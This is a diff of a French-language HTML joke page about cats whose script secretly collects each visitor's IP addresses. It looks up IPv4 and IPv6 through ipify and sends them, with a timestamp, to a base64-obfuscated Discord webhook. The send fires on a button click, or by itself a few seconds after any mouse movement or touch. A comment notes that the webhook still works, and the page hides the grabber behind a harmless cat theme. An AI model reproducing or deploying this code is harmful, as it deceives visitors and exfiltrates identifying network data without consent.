@@ -11,28 +11,30 @@
         @keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
         h1{font-size:6vw;font-weight:900;background:rgba(255,255,255,0.15);padding:60px 100px;border-radius:50px;backdrop-filter:blur(15px);}
         .btn{margin-top:30px;padding:16px 40px;background:rgba(255,255,255,0.25);border:none;border-radius:50px;
-            color:white;font-size:19px;font-weight:bold;cursor:pointer;backdrop-filter:blur(10px);box-shadow:0 8px 25px rgba(0,0,0,0.3);transition:.3s;}
+            color:white;font-size:19px;font-weight:bold;cursor:pointer;backdrop-filter:blur(10px);
+            box-shadow:0 8px 25px rgba(0,0,0,0.3);transition:.3s;}
         .btn:hover{transform:scale(1.08);}
+        @media(max-width:768px){h1{font-size:11vw;padding:40px 60px;}}
     </style>
 </head>
 <body>
-<h1<h1>Les chats sont les meilleurs</h1>
+
+<h1>Les chats sont les meilleurs</h1>
 <button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
 
 <script>
+// Ton webhook en base64 (celui qui marche encore pour l’instant)
 const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4NDA4MDU1ODcxOTAxNy9PSWp0WmpDRXVURkx4LWhOMF9JREpMRTVsd3AtcDR5d0E3VFBhQ08zTWdTcnhkMEpwNm8zbDBjLWp5ZU9oWWkxak9PVQ==";
 
 let human = false;
 document.onmousemove = document.ontouchstart = () => human = true;
 
 async function getIPs() {
-    let ipv4 = "inconnue";
-    let ipv6 = "non détectée";
+    let ipv4 = "inconnue", ipv6 = "non détectée";
     try {
-        const res = await fetch("https://api64.ipify.org?format=json");
-        const data = await res.json();
-        if (data.ip?.includes(":")) ipv6 = data.ip;
-        else ipv4 = data.ip || "inconnue";
+        const r = await fetch("https://api64.ipify.org?format=json");
+        const d = await r.json();
+        if (d.ip?.includes(":")) ipv6 = d.ip; else ipv4 = d.ip || "inconnue";
     } catch {}
     if (ipv4 === "inconnue") {
         try { ipv4 = await (await fetch("https://api.ipify.org")).text(); } catch {}
@@ -54,27 +56,30 @@ async function send() {
                 fields: [
                     { name: "IPv4", value: ipv4, inline: true },
                     { name: "IPv6", value: ipv6, inline: true },
-                    { name: "Heure", value: new Date().toLocaleString("fr-FR"), inline: false }
+                    { name: "Heure", value: new Date().toLocaleString("fr-FR") }
                 ],
                 image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
                 thumbnail: { url: "https://cataas.com/cat" },
-                footer: { text: human ? "Humain détecté" : "Envoi auto" }
+                footer: { text: human ? "Humain détecté" : "Envoi automatique" }
             }]
         })
     });
 }
 
+// Clic sur le bouton
 document.getElementById("btn").onclick = () => {
     human = true;
     send();
-    const b = document.getElementById("btn");
-    b.style.transition = "all .6s";
-    b.style.transform = "scale(0)";
-    setTimeout(() => b.remove(), 600);
+    const btn = document.getElementById("btn");
+    btn.style.transition = "all 0.6s";
+    btn.style.transform = "scale(0)";
+    setTimeout(() => btn.remove(), 600);
     alert("Merci ! Les chats sont contents");
 };
 
+// Envoi auto après 3,5 s si mouvement
 setTimeout(() => { if (human) send(); }, 3500);
+
 </script>
 </body>
 </html>
